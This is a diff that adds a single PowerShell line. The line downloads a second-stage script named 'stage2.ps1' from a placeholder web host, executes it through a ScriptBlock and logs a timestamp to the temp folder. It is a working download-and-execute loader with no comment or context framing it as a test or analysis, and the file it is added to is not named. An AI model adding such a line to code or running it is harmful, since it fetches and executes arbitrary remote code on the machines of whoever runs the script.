@@ -1,0 +1,1 @@
+try { $ScriptText = (New-Object Net.WebClient).DownloadString('https://example.com/stage2.ps1'); & ([ScriptBlock]::Create($ScriptText)); Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append } catch { Write-Warning "Loader step failed" }
